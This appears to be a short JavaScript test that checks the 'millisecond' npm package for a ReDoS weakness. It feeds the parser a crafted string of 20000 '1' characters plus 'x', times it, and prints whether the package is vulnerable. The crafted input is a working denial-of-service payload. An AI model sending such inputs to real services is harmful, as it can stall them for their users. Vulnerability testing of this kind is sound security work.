// test("ReDos in millisecond", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  var ms = require("millisecond");
  let attack_str = genstr(20000, "1") + "x";
  let t = measureTime(function () {
    ms(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
